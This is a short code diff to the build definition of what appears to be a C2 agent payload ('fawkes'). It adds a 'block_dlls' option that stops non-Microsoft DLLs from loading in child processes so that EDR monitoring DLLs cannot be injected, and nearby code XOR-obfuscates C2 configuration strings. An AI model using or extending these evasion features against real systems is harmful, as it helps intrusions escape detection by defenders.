@@ -204,6 +204,13 @@ var payloadDefinition = agentstructs.PayloadType{
 			DefaultValue:  false,
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
 		},
+		{
+			Name:          "block_dlls",
+			Description:   "Block non-Microsoft DLLs from being loaded in child processes spawned by the agent (run, powershell). Prevents EDR from injecting monitoring DLLs. Windows only — no-op on Linux/macOS.",
+			Required:      false,
+			DefaultValue:  false,
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
+		},
 	},
 	BuildSteps: []agentstructs.BuildStep{
 		{
@@ -379,6 +386,9 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	}
 	if autoPatch, err := payloadBuildMsg.BuildParameters.GetBooleanArg("auto_patch"); err == nil && autoPatch {
 		ldflags += fmt.Sprintf(" -X '%s.autoPatch=true'", fawkes_main_package)
+	}
+	if blockDlls, err := payloadBuildMsg.BuildParameters.GetBooleanArg("block_dlls"); err == nil && blockDlls {
+		ldflags += fmt.Sprintf(" -X '%s.blockDLLs=true'", fawkes_main_package)
 	}
 
 	// String obfuscation: XOR-encode C2 config strings with a random key
